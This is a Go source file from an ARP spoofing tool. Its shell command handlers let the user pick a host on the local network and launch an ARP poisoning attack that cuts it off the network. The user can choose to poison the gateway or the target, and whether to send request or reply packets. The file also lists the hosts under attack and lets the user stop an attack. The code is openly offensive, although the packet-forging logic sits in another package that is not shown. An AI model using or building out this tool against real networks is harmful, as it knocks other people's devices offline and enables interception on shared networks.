package controllers

import (
	"ARPSpoofing/dao/redis"
	"ARPSpoofing/logic"
	"ARPSpoofing/models"
	"ARPSpoofing/pkg/table"
	"ARPSpoofing/settings"
	"ARPSpoofing/vars"
	"fmt"

	"github.com/abiosoft/ishell"
	"github.com/fatih/color"
)

//CutHandler 断网功能
func CutHandler(c *ishell.Context) {
	//1.接收参数
	gateway, err := settings.Options.Get("gateway")
	if err != nil {
		c.Println("请先设定网关 set gateway value")
		return
	}
	//2.选择目标主机
	ipList, err := redis.NewHosts().GetAllIP()
	if err != nil {
		c.Println("redis get ip list failed,err:", err)
		return
	}
	var noCuttedList []string = make([]string, 0)
	for i := range ipList {
		_, exist := vars.HostCancelMap[ipList[i]]
		if exist {
			continue
		}
		noCuttedList = append(noCuttedList, ipList[i])
	}
	if len(noCuttedList) == 0 {
		c.Println("所有主机都被切断了")
		return
	}
	targetIndex := c.MultiChoice(noCuttedList, "which host do you want to attack?")

	//3.选择欺骗方式
	methods := []string{
		string(models.DeceitGateway),
		string(models.DeceitTarget),
	}
	methodIndex := c.MultiChoice(methods, "Deceit gateway or target?")

	//4.选择包类型
	packetTypes := []string{
		string(models.Request),
		string(models.Reply),
	}
	typeIndex := c.MultiChoice(packetTypes, "Send Reply packet or Request packet?")
	//5.输出配置
	showCutConfig(noCuttedList[targetIndex], gateway, methods[methodIndex], packetTypes[typeIndex])

	//6.业务逻辑
	err = logic.Cut(models.DeceitWay(methods[methodIndex]),
		models.PacketType(packetTypes[typeIndex]),
		gateway,
		noCuttedList[targetIndex])
	if err != nil {
		c.Println(color.RedString(fmt.Sprintf("[*] 欺骗协程启动失败 logic.Cut faild,err:%v", err)))
		return
	}
	c.Println(color.GreenString("[*] 欺骗协程启动成功"))
	c.Println(color.GreenString("[*] show cutted 查看当前正在被攻击的设备"))
}

//StopCutHandler 停止攻击
func StopCutHandler(c *ishell.Context) {
	hosts := make([]string, 0)
	for key := range vars.HostCancelMap {
		hosts = append(hosts, key)
	}
	if len(hosts) == 0 {
		c.Println("暂时没有受攻击的主机")
		return
	}
	choice := c.MultiChoice(hosts, "Please select host.")
	c.Println("Stop cutting:", hosts[choice])
	vars.HostCancelMap[hosts[choice]]()
	delete(vars.HostCancelMap, hosts[choice])
}

func showCutConfig(target, gateway, deceitWay, packetType string) {
	headers := []string{"目标", "网关", "欺骗方式", "包类型"}
	data := [][]string{{target, gateway, deceitWay, packetType}}
	table.Show(headers, data)
}
